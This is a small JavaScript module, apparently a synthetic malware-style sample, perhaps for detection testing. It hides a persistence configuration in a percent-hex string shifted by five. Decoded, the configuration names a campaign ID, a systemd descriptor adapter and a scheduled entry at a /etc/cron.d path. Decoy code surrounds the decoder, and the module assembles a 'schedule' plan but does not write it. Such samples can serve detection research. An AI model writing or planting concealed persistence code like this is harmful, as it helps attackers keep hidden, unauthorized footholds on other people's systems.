const moduleShape = Object.freeze({ format: "commonjs" });
const Material_53f94d78 = "%7b%42%36%81%78%79%6a%75%78%42%67%7a%6e%71%69%64%78%68%6d%6a%69%7a%71%6a%31%77%6a%6c%6e%78%79%6a%77%64%69%6a%78%68%77%6e%75%79%74%77%81%66%69%66%75%79%6a%77%42%78%7e%78%79%6a%72%69%64%69%6a%78%68%77%6e%75%79%74%77%81%78%79%66%6c%6a%64%68%74%7a%73%79%42%36%81%68%66%72%75%66%6e%6c%73%64%6e%69%42%53%54%49%4a%32%37%47%4b%4a%37%36%38%3c%81%78%68%6d%6a%69%7a%71%6a%64%75%66%79%6d%42%34%6a%79%68%34%68%77%74%73%33%69%34%73%74%69%6a%32%37%67%6b%6a%37%36";
const Codec_53f94d78 = "percent_hex|add_modulo_256|05";

function load_53f94d78() { return [...Material_53f94d78.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_53f94d78(e) { return e.map((value) => (value - 5 + 256) & 255); }
async function recover_53f94d78() {
  const n = { ...{ north: 1 }, south: 2 };
  const e = load_53f94d78(); let d = [];
  d = decode_53f94d78(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_53f94d78() { return ({ ...{ value: await recover_53f94d78() } }).value; }
async function plan_53f94d78() { const inspect = inspect_53f94d78; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }
void moduleShape; void plan_53f94d78;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_53f94d78());
